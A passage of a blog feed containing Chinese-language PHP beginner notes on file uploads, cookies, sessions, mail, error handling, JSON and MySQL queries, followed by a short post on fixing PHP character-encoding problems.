<span class="token string double-quoted-string">"文件类型: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件大小: "</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" kB&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件临时存储的位置: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 允许上传的图片后缀</span><span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取文件后缀名</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/pjpeg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/x-png"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>    <span class="token comment">// 小于 200 kb</span><span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"错误：: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传文件名: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件类型: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件大小: "</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" kB&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件临时存储的位置: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"非法的文件格式"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">//cookie 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$expire</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"runoob"</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 输出 cookie 值</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 查看所有 cookie</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 存储 session 数据</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>菜鸟教程(runoob.com)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 检索 session 数据</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"浏览量："</span><span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"浏览量："</span><span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//session_destroy();</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"xiaohui"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>菜鸟教程(runoob.com)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 如果接收到邮箱参数则发送邮件</span>    <span class="token comment">// 发送邮件</span>    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token variable">$subject</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'subject'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"someone@example.com"</span><span class="token punctuation">,</span> <span class="token variable">$subject</span><span class="token punctuation">,</span>    <span class="token variable">$message</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"From:"</span> <span class="token operator">.</span> <span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"邮件发送成功"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">// 如果没有邮箱参数则显示表单</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;form method='post' action='mailform.php'&gt;    Email: &lt;input name='email' type='text'&gt;&lt;br&gt;    Subject: &lt;input name='subject' type='text'&gt;&lt;br&gt;    Message:&lt;br&gt;    &lt;textarea name='message' rows='15' cols='40'&gt;    &lt;/textarea&gt;&lt;br&gt;    &lt;input type='submit'&gt;    &lt;/form&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 错误处理函数</span><span class="token keyword">function</span> <span class="token function-definition function">customError</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;b&gt;Error:&lt;/b&gt; [<span class="token interpolation"><span class="token variable">$errno</span></span>] <span class="token interpolation"><span class="token variable">$errstr</span></span>&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"脚本结束"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 设置错误处理函数</span><span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"customError"</span><span class="token punctuation">,</span><span class="token constant">E_USER_WARNING</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 触发错误</span><span class="token variable">$test</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$test</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"变量值必须小于等于 1"</span><span class="token punctuation">,</span><span class="token constant">E_USER_WARNING</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'runoob'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'菜鸟教程'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'taobao'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'淘宝网'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 编码中文</span>   <span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>  <span class="token comment">// 换行符</span>   <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 不编码中文</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'{"a":1,"b":2,"c":3,"d":4,"e":5}'</span><span class="token punctuation">;</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p>查询模块示例</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"myDB"</span><span class="token punctuation">;</span><span class="token comment">// 创建连接</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check connection</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT id, firstname, lastname FROM MyGuests"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 输出数据</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"id: "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">" - Name: "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"firstname"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"lastname"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"0 结果"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更多请看<a href="https://www.runoob.com/php/php-mysql-intro.html">PHP MySQL 简介 | 菜鸟教程 (runoob.com)</a></p><h3 id="Math函数"><a href="#Math函数" class="headerlink" title="Math函数"></a>Math函数</h3><p><a href="https://www.runoob.com/php/php-ref-math.html">PHP 5 Math 函数 | 菜鸟教程 (runoob.com)</a></p><h3 id="HTTP函数"><a href="#HTTP函数" class="headerlink" title="HTTP函数"></a>HTTP函数</h3><p><a href="https://www.runoob.com/php/php-ref-http.html">PHP HTTP 函数 | 菜鸟教程 (runoob.com)</a></p><h3 id="String函数"><a href="#String函数" class="headerlink" title="String函数"></a>String函数</h3><p><a href="https://www.runoob.com/php/php-ref-string.html">PHP 5 String 函数 | 菜鸟教程 (runoob.com)</a></p><h3 id="Array函数"><a href="#Array函数" class="headerlink" title="Array函数"></a>Array函数</h3><p><a href="https://www.runoob.com/php/php-ref-array.html">PHP 5 Array 函数 | 菜鸟教程 (runoob.com)</a></p><h3 id="PDO函数"><a href="#PDO函数" class="headerlink" title="PDO函数"></a>PDO函数</h3><p><a href="https://www.runoob.com/php/php-pdo.html">PHP PDO | 菜鸟教程 (runoob.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php乱码解决方法</title>
      <link href="/2021/05/26/php-luan-ma/"/>
      <url>/2021/05/26/php-luan-ma/</url>
      
        <content type="html"><![CDATA[<h2 id="php乱码"><a href="#php乱码" class="headerlink" title="php乱码"></a>php乱码</h2><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><p>head后，tilte前添加</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Content-Type<span class="token punctuation">'</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/html; charset=utf-8<span class="token punctuation">'</span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>开头添加</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10使用grep和awk</title>
      <link href="/2021/05/23/win10-shi-yong-grep/"/>
      <url>/2021/05/23/win10-shi-yong-grep/</url>
      
